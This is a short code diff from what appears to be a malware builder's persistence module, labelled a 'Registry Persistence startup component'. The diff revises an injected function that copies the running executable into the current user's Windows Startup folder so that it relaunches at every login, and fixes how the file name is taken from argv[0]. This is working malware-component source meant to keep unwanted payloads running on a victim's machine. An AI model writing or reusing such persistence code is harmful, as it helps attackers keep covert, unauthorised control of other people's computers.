@@ -12,8 +12,8 @@ def main(option):
         config.import_statements.append('from getpass import getuser')
         config.startup.append('startup_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
         config.functions.append('''
-def startup_persist_startup(path):
-        copy(path, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + argv[0])
+def startup_persist_startup(filepath):
+        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
 ''')
     elif option == 'info':
         print '\nName             : Registry Persistence startup component' \
